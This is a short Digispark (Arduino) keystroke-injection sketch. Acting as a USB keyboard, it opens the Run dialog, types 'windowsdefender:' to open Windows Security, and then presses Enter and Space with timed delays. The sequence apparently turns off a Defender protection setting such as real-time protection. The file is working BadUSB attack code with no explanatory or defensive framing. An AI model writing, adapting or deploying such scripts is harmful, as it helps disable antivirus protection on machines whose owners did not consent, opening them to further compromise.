#include <DigiKeyboard.h>

void setup() {}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(10);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("windowsdefender:");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(7000);

  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  /*
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(20);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(20);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(20);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(20);
  */
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  /*
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(20);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(20);
  */
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(20);
  /*
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(20);
  */
  DigiKeyboard.sendKeyStroke(KEY_SPACE);
  DigiKeyboard.delay(2000);


  for (;;) {
    /*empty loop*/
  }
}
